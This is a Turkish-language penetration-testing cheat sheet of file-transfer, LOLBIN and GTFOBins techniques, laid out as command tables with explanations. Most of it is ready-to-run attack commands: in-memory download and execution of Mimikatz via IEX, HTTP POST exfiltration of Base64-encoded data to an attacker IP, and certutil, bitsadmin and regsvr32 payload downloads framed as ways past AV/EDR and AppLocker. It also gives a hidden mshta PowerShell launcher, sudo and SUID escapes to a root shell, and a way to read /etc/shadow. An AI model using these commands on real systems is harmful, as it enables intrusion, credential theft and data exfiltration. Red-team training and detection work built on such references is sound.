# Dosya Transferi, LOLBINs ve GTFOBins Rehberi (Cheat Sheet)

Bu rehber, sızma testlerinde (Penetration Testing) ve kırmızı takım (Red Team) operasyonlarında hedef sistemler üzerine zararlı yazılım/araç indirme, veri sızdırma (Exfiltration) ve sistemde yerleşik bulunan araçları güvenlik önlemlerini aşmak için kullanma tekniklerini mantığıyla açıklamaktadır.

---

## 1. PowerShell İle Dosya Transferi ve Bellekte Çalıştırma (Windows)

PowerShell, Windows ekosisteminde ek bir araca ihtiyaç duymadan dosya indirmek ve bellekte (In-Memory) script çalıştırmak için en çok tercih edilen yöntemdir.

| Komut | Açıklama | Mantığı ve Amacı |
| :--- | :--- | :--- |
| **`Invoke-WebRequest https://<link>/PowerView.ps1 -OutFile PowerView.ps1`** | PowerShell ile dosya indirir. | HTTP/HTTPS üzerinden hedef aracı diske kaydeder. Linux'taki `wget` veya `curl` komutunun PowerShell karşılığıdır. |
| **`IEX (New-Object Net.WebClient).DownloadString('https://<link>/Invoke-Mimikatz.ps1')`** | Dosyayı diske yazmadan bellekte (In-Memory) çalıştırır. | `IEX` (Invoke-Expression), internetteki scripti doğrudan RAM'e yükler. Disk tabanlı Antivirüs/EDR tespitlerini aşmak için kritik bir tekniktir. |
| **`Invoke-WebRequest -Uri http://10.10.10.32:443 -Method POST -Body $b64`** | PowerShell ile dışarıya veri/dosya yükler (Upload). | Hedef sistemdeki hassas verileri Base64 formatına çevirip kendi dinleyici sunucumuza HTTP POST isteğiyle sızdırmamızı (Exfiltration) sağlar. |
| **`Invoke-WebRequest http://nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile "nc.exe"`** | User-Agent başlığını Chrome olarak gizleyerek dosya indirir. | Güvenlik duvarları veya web filtreleri varsayılan "PowerShell" User-Agent başlığını engelleyebilir. Bu komut isteği sıradan bir Google Chrome tarayıcısı gibi gösterir. |

---

## 2. Sistem Araçlarıyla Dosya Transferi (Windows & Linux)

Hedef sistemde varsayılan olarak bulunan protokol ve komut satırı araçları kullanılarak yapılan transferlerdir.

| Komut | Açıklama | Mantığı ve Amacı |
| :--- | :--- | :--- |
| **`bitsadmin /transfer n http://10.10.10.32/nc.exe C:\Temp\nc.exe`** | Windows BITS servisi ile dosya indirir. | Background Intelligent Transfer Service (BITS), arka planda hissettirmeden dosya indirmeye yarar. Çoğu zaman varsayılan güvenlik denetimlerine takılmaz. |
| **`certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe`** | Certutil aracı ile dosya indirir. | Sertifika doğrulamak için tasarlanmış bu yerleşik Windows bileşeni, kötüye kullanılarak internetten dosya çekmek için sıkça kullanılır. |
| **`wget https://raw.githubusercontent.com/.../LinEnum.sh -O /tmp/LinEnum.sh`** | Linux `wget` ile dosya indirir. | Belirtilen URL'deki aracı indirip `/tmp` gibi okuma/yazma yetkisi olan geçici bir klasöre kaydeder. |
| **`curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/.../LinEnum.sh`** | Linux `curl` ile dosya indirir. | HTTP/HTTPS isteği atarak gelen veri akışını belirtilen `-o` (output) dosyasına yazar. |
| **`php -r '$file = file_get_contents("https://..."); file_put_contents("LinEnum.sh",$file);'`** | PHP ile dosya indirir. | Sistemde web sunucusu veya PHP derleyicisi varsa, tek satırlık PHP koduyla dışarıdan dosya çekip diske yazar. |
| **`scp C:\Temp\bloodhound.zip user@10.10.10.150:/tmp/bloodhound.zip`** | SCP ile yerelden uzaktaki sunucuya dosya yükler. | SSH protokolü üzerinden şifreli ve güvenli bir şekilde yerel sunucudaki dosyayı hedef Linux sunucuya aktarır. |
| **`scp user@target:/tmp/mimikatz.exe C:\Temp\mimikatz.exe`** | SCP ile uzaktaki sunucudan dosya indirir. | SSH yetkisi olan hedef makinadaki bir dosyayı kendi yerel makinemize çekmeyi sağlar. |

---

## 3. Ekstra: LOLBINs (Living Off The Land Binaries - Windows)

**LOLBINs nedir?** Windows işletim sisteminde varsayılan olarak imzalı ve güvenilir kabul edilen, ancak saldırganlar tarafından zararlı çalıştırmak, dosya indirmek veya savunmayı atlatmak (EDR/AV Bypass) için kötüye kullanılan sistem araçlarıdır.

*   **Proje Adresi:** [LOLBAS (Living Off The Land Binaries and Scripts)](https://lolbas-project.github.io/)

| Araç / LOLBIN | Örnek Saldırı Komutu | Mantığı ve Amacı |
| :--- | :--- | :--- |
| **`Certutil`** | `certutil -urlcache -split -f http://10.10.10.32/payload.exe payload.exe` | Varsayılan güvenlik duvarlarını aşarak dışarıdan çalıştırılabilir dosya (`.exe`) indirmek için kullanılır. |
| **`MSHTA`** | `mshta.exe vbscript:Close(Execute("CreateObject(""WScript.Shell"").Run ""powershell -nop -w hidden -c <cmd>"",0"))` | Windows HTML Application sunucusunu kullanarak doğrudan VBScript veya JScript kodu çalıştırmaya ve PowerShell tetiklemeye yarar. |
| **`Regsvr32`** | `regsvr32 /s /n /u /i:http://10.10.10.32/payload.sct scrobj.dll` | (Squiblydoo Tekniği) İnternetteki bir `.sct` dosyasını çekerek AppLocker/Application Control mekanizmalarını tamamen aşar ve kod çalıştırır. |
| **`Rundll32`** | `rundll32.exe javascript:"..\mshtml,RunHTMLApplication ";document.write();...` | DLL dosyalarını çalıştırmak için kullanılan bu sistem aracıyla doğrudan bellekte kod veya JavaScript yürütülebilir. |

---

## 4. Ekstra: GTFOBins (Linux / Unix)

**GTFOBins nedir?** Linux/Unix sistemlerde meşru olarak bulunan ikili dosyaların (binaries), sistemdeki yanlış yapılandırmalar (Örn: `SUDO` veya `SUID` hakları) kullanılarak kısıtlı kabuklardan (Restricted Shell) kaçmak, dosya okumak/yazmak veya yetki yükseltmek (Root olmak) amacıyla kötüye kullanılmasıdır.

*   **Proje Adresi:** [GTFOBins](https://gtfobins.github.io/)

| Araç / Binary | Örnek Saldırı Komutu | Mantığı ve Amacı |
| :--- | :--- | :--- |
| **`Find`** | `sudo find . -exec /bin/sh \; -quit` | Eğer `find` komutuna `sudo` yetkisi verildiyse, `-exec` parametresi ile doğrudan `root` haklarında bir terminal (`/bin/sh`) açılabilir. |
| **`Python`** | `python -c 'import pty; pty.spawn("/bin/bash")'` | Kısıtlı veya etkileşimsiz bir shell ortamını (reverse shell) tam etkileşimli TTY Bash terminaline yükseltmek için kullanılır. |
| **`Bash (SUID)`** | `bash -p` | Eğer `bash` üzerinde SUID biti aktifse, `-p` parametresi ile UID/GID hakları sıfırlanmadan doğrudan `root` yetkisinde shell alınır. |
| **`Vim / Nano`** | `sudo vim -c ':!/bin/sh'` | Metin editörüne `sudo` yetkisi verilmişse, editörün içindeki komut çalıştırma modundan faydalanarak `root` shell'e geçilir. |
| **`Base64`** | `base64 "/etc/shadow" \| base64 --decode` | Okuma yetkimiz olmayan hassas bir dosyayı (Örn: `/etc/shadow`), `base64` komutuna verilen SUID/Sudo hakkını kullanarak okuma tekniğidir. |
